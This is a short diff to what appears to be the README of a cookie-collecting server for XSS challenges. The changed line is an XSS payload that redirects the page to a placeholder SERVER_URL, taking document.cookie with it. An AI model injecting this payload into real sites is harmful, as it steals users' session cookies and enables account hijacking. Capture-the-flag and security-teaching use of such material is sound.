@@ -15,7 +15,7 @@ Sending a request to `/c?c=COOKIE` adds `COOKIE` to `cookie.txt` in the same dir
 
 The following script sends all the accessible cookies in the current document to the server(Can be used in XSS challenges).
 ```HTML
-<script>location.href = "/cookie?c=" + document.cookie;</script>
+<script>location.href = "SERVER_URL/cookie?c=" + document.cookie;</script>
 ```
 
 ### view collected cookies
